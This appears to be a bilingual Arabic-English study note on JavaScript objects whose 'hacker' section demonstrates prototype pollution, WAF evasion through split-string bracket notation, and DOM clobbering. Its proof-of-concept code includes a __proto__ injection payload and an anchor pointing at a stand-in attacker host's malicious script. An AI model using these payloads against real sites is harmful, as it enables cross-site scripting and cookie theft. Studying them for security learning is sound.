

9. Objects in JavaScript

Definition:
An Object is a collection of related data stored as key-value pairs (properties and methods).

Syntax & Property Access:
const user = {
    username: "silentn0va",
    role: "admin",
    age: 25
};

// Accessing Properties:
console.log(user.username);      // Dot Notation
console.log(user["role"]);       // Bracket Notation (Useful for dynamic keys)

// Modifying & Adding Properties:
user.age = 26;                   // Update existing property
user.isVerified = true;          // Add new property

// Deleting Properties:
delete user.isVerified;

// Checking Property Existence:
console.log("role" in user);              // true
console.log(user.hasOwnProperty("age")); // true

### (JS Core Concept)

الكائنات (**Objects**) هي أهم جزء في الجافاسكريبت تقريباً ("In JavaScript, almost everything is an object").

- **مفهوم الكائن:** الكائن هو جدول بيانات بيخزن معلومات مرتبطة ببعضها في شكل **مفتاح وقيمة (Key-Value Pairs)**.
    
- **طرق الوصول للخصائص:**
    
    - **Dot Notation (`obj.prop`):** أسهل وأسرع طريقة لما تكون عارف اسم الخصية صراحة.
        
    - **Bracket Notation (`obj["prop"]`):** بتسمحلك توصل للخاصية باستخدام String أو متغير، وده مفيد جداً لما يكون اسم الخصية فيه مسافات أو رموز خاصة أو بيتحدد أثناء التشغيل (Dynamic Key).
        
- **إضافة وتعديل وحذف الخصائص:** تقدر تضيف خصائص جديدة في أي وقت أو تعدلها، وكلمة `delete` بتمسح الخصية تماماً من الأوبجكت.
    
- **مفهوم الـ Prototype (السلسلة المورثة):** كل الأوبجكتس في JS بتورث خصائص ودوال افتراضية من الأوبجكت الأب `Object.prototype`.
    

### 3. 💻 مثال برمجي تقليدي (Standard Example)

JavaScript

```
const myCar = {
    brand: "Toyota",
    model: "Corolla",
    startEngine: function() {
        console.log("Engine Started...");
    }
};

// Dynamic Property Access using Bracket Notation
let targetKey = "brand";
console.log(myCar[targetKey]); // "Toyota"

// Accessing method
myCar.startEngine(); // "Engine Started..."

// Checking property
if ("model" in myCar) {
    console.log("Model is specified.");
}
```

### 4. ⚔️ منظور الهكر (JS for Hackers)

في عالم الأمن السيبراني واختبار الاختراق، الأوبجكتس هي المنجم الرئيسي لثغرات الـ Client-Side والـ Node.js Backend:

1. **ثغرة تلوث البروتوتايب (Prototype Pollution):**
    
    - بما إن كل الأوبجكتس المبتكرة بتورث من `Object.prototype` عبر خاصية خفية اسمها `__proto__` أو `constructor.prototype`.
        
    - لو قدر المهاجم يحقن خاصية جوه `Object.prototype` (عبر دالة الدمج `Object.assign` أو `lodash.merge` الضعيفة)، الخاصية دي بتظهر فوراً في **جميع الأوبجكتس** الموجودة في التطبيق!
        
    - ده بيمهد لـ **DOM XSS** في المتصفح أو **Remote Code Execution (RCE)** في تطبيقات Node.js Backend.
        
2. **التجاوز التام للـ WAFs بالـ Bracket Notation:**
    
    - الـ WAFs بتراقب الكلمات المسدودة المربوطة بنقطة زي `window.location` أو `document.cookie` أو `window.eval`.
        
    - باستخدام الـ Bracket Notation وتفكيك النصوص، الهكر بيقدر يستدعي الخصائص دي من غير ما الكلمة تبان صريحة: `window["docu"+"ment"]["coo"+"kie"]`.
        
3. **اختطاف الكائنات عبر HTML (DOM Clobbering):**
    
    - المتصفح بيعمل تحويل تلقائي لعناصر HTML اللي ليها `id` أو `name` لـ Global Variables جوه الـ `window` object.
        
    - المهاجم يقدر يحقن عنصر HTML باسم يطابق اسم أوبجكت مستخدم في الموقع (زي `window.config`) ويكسر منطق التطبيق.
        
4. **التلاعب بالـ State والـ Mass Assignment Vulnerabilities:**
    
    - لما التطبيق بياخد JSON Object من المهاجم وبيعمله دمج مباشر في كائن الـ User:
        
    - المهاجم بيضيف مفاتيح غير متوقعة جوه الـ Object زي `"isAdmin": true` لتصعيد الصلاحيات.
        

### 5. 🎯 أمثلة هجومية وسيناريوهات استغلال (PoC & Payloads)

#### 📌 السيناريو الأول: ثغرة Prototype Pollution تؤدي لـ DOM XSS

تخيل تطبيق بياخد إعدادات من رابط الموقع ويدمجها في الأوبجكت الافتراضي:

JavaScript

```
// كود تطبيق يحتوي على دالة دمج غير آمنة
function merge(target, source) {
    for (let key in source) {
        if (typeof target[key] === 'object' && typeof source[key] === 'object') {
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}

// Payload المهاجم المحقون عبر JSON أو URL Query
let attackerPayload = JSON.parse('{"__proto__": {"transportUrl": "javascript:alert(document.cookie)"}}');

let userConfig = {};
merge(userConfig, attackerPayload);

// الآن تم تلوث Object.prototype بالكامل!
// أي أوبجكت جديد سيحمل خاصية transportUrl الملوثة:
let newElement = {};
console.log(newElement.transportUrl); // Output: "javascript:alert(document.cookie)"
```

#### 📌 السيناريو الثاني: تجاوز الـ WAF بالـ Dynamic Bracket Notation

استدعاء دالة `eval` وتأدية XSS كامل من أوبجكت `window` بدون كتابة اسم الدالة بشكل مباشر:

JavaScript

```
// بدل كتابة: window.eval("alert(1)")

// المهاجم بيبتكر مفتاح ديناميكي للاستدعاء:
const fn = "ev" + "al";
const pay = "al" + "ert(1)";

window[fn](pay); // ينفذ alert(1) ويتجاوز الـ Signature Scanners
```

#### 📌 السيناريو الثالث: ثغرة DOM Clobbering لإلغاء أوبجكت الإعدادات

تخيل الموقع بيتحقق من كائن الإعدادات قبل استدعاء سكربت خارجي:

JavaScript

```
// كود الموقع الأصلي:
var config = window.config || { scriptUrl: "https://trusted.com/app.js" };

// المهاجم يحقن نموذج HTML لتغيير الأوبجكت:
// <a id="config" href="https://attacker.com/malicious.js">

// الآن window.config أصبحت تشير لـ HTML Anchor Element وليس Object عادي!
// وعند محاولة الوصول لـ config.href سيتم تحميل سكربت المهاجم بدلاً من السكربت الأصلي!
```
